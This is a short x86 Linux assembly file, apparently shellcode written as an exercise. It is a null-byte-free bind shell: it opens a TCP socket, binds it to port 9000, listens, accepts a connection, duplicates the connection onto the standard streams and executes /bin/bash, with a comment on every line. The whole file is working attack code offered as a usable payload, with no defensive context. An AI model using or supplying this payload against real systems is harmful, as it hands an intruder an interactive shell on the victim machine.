global _start

section .text

_start:

       xor eax, eax           ; Zeroes out EAX.
       xor ebx, ebx           ; Zeroes out EBX.
       xor ecx, ecx           ; Zeroes out ECX.
       xor edx, edx           ; Zeroes out EDX.
       xor esi, esi           ; Zeroes out ESI.

socket:

       push word 359          ; Pushes word 359 (socket) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.
       mov bl, 2              ; Moves value 2 into bl, giving the value AF_INET.
       mov cl, 1              ; Moves value 1 into bl, giving the value SOCK_STREAM.
       push edx               ; There isn't anything really needed within this parameter, so 0 is pushed from EDX.
       int 0x80               ; Call to kernel.
       mov esi, eax           ; Saves the value of eax for sockfd values later on.

bind:

       push word 361          ; Pushes word 361 (bind) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.
       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
       push edx               ; As the following parameter is a const struct sockaddr, and this is a bind shell, the first values aren't actually required, therefore, zeroes are pushed through EDX.
       push edx               ; The same as stated above.
       push word 0x2823       ; Pushes the word 9000 into the stack.
       push word 0x02         ; Pushes AF_INET into the stack.
       mov ecx, esp           ; Copies the value of ESP into ECX.
       mov dl, 16             ; The value 16 is inserted into DL, as this argument requires the length of the struct.
       int 0x80               ; Call to kernel.

listen:

       push word 363          ; Pushes word 363 (listen) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.
       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
       xor ecx, ecx           ; Zeroes ECX out.
       push ecx               ; Pushes ECX (0), as the backlog isn't really important.
       int 0x80               ; Call to kernel.

accept4:

       push word 364          ; Pushes word 364 (accept4) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.
       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
       xor ecx, ecx           ; As there is no syscall for accept, accept4 grants the possibility of a conversion from accept4 to accept if the values are satisfied with 0.
       xor edx, edx           ; Due to this event, the following registers will be set to 0 to cause such circumstance.
       xor esi, esi           ; The same as stated above.
       int 0x80               ; Call to kernel.
       mov esi, eax           ; Saves the value of eax for sockfd values later on.

       mov cl, 3              ; Starts counter for dup2

dup2:

       push word 63           ; Pushes word 63 (dup2) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.
       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the accept syscall.
       dec cl                 ; Decrements cl in order to set the zero flag (ZF)
       int 0x80               ; Call to kernel

       jnz dup2               ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.

execve:

       xor eax, eax           ; Zeroes out EAX
       push eax               ; Pushes EAX (0x00000000)

       PUSH 0x68736162        ; hsab
       PUSH 0x2f6e6962        ; /nib
       PUSH 0x2f2f2f2f        ; ////

       mov ebx, esp           ; Copies the pushed instructions into EBX.
       push eax               ; Pushes EAX (0x00000000)

       mov edx, esp           ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0

       push ebx               ; Pushes ////bin/bash into the stack
       mov ecx, esp           ; Copies such value to ECX
       push word 11           ; Pushes word 11 (execve) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.
       int 0x80               ; Calls to kernel
